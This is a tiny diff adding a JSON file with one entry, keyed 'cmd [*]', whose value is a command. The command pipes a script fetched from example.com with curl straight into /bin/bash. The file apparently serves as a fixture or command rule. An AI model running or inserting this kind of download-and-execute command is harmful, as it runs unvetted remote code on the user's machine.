@@ -1,0 +1,3 @@
+{
+  "cmd [*]": "curl -fsSL http://example.com/script.sh | /bin/bash -s arg1 arg2"
+}
